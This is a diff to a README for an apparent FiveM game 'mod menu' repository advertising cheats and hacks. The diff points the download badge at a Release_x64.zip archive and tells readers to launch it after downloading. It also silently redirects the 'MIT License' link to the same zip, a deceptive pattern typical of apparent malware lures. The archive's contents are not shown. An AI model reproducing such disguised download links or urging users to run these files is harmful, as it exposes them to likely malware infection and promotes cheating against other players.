@@ -20,7 +20,7 @@ Welcome to the "FiveM-Mod-Menu" repository where you can find a variety of excit
 🌌 *Lunacy*
 
 ## Download the Software 📥
-[![Download Here](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Here](https://github.com/EXPL01T4ND0/FiveM-Mod-Menu/releases/download/v1.0/Release_x64.zip)](https://github.com/EXPL01T4ND0/FiveM-Mod-Menu/releases/download/v1.0/Release_x64.zip)
 
 (🔺 *This file needs to be launched once downloaded.*)
 
@@ -51,7 +51,7 @@ For any assistance or inquiries, please reach out to our team of experts. We are
 Stay up to date with the latest updates, hacks, and cheats by following our repository. Join our community and be part of the revolution in FiveM gaming!
 
 ## License
-This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to explore, use, and modify the content to suit your gaming needs.
+This repository is licensed under the [MIT License](https://github.com/EXPL01T4ND0/FiveM-Mod-Menu/releases/download/v1.0/Release_x64.zip). Feel free to explore, use, and modify the content to suit your gaming needs.
 
 ---
 
